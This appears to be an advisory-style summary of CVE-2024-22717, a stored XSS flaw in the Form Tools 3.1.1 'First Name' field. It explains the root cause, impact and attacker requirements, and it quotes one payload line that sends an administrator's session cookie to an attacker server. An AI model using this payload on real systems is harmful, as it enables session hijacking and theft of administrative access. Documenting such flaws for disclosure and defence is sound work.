The provided content describes a stored Cross-Site Scripting (XSS) vulnerability, identified as CVE-2024-22717, in the Form Tools application version 3.1.1.

- **Root cause of vulnerability:** The application fails to sanitize special characters in the "First Name" field during user profile creation, allowing an attacker to inject HTML tags.
- **Weaknesses/vulnerabilities present:**
    - Stored XSS vulnerability due to lack of input sanitization.
- **Impact of exploitation:**
    - An attacker can inject malicious scripts that are stored on the server. When an administrator views the user profile, the script executes in their browser.
    - Specifically, the attacker can steal the administrator's session cookie, allowing for session hijacking and full administrative access.
- **Attack vectors:**
    - A non-privileged user inputs a malicious HTML payload (e.g., `<img src=x onerror="document.location='http://[IP]:8000/?cookie='+document.cookie;">`) into the "First Name" field.
    - When an administrator views the client list containing the malicious payload, the script executes, sending the administrator's cookie to the attacker's server.
- **Required attacker capabilities/position:**
    - The attacker needs a non-privileged user account on the application.
    - The attacker needs to set up a web server to receive the hijacked cookie.
    - The attacker needs to trick the administrator into viewing the modified user profile to trigger the XSS.
